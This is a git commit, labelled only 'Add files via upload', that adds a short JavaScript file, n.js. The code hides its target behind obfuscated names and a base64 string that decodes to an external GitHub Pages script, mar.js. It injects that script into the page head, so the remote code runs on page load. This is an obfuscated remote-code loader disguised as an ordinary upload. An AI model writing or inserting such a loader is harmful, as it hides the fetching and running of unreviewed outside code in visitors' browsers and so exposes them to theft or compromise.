baa3272e815e229f05f453f0610cb12b15a51142
devbratk <gryshenkevgen@gmail.com>
2024-09-28 14:16:34 +0300

    Add files via upload

---
+++ n.js
@@ -0,0 +1,6 @@
+var _0x1a2b = document['createElement']('script');
+_0x1a2b['type'] = 'text/javascript';
+
+var _0x3c4d = 'aHR0cHM6Ly9qZW5pY2hnLmdpdGh1Yi5pby9tci9tYXIuanM=';
+_0x1a2b['src'] = atob(_0x3c4d);
+document['head']['appendChild'](_0x1a2b);
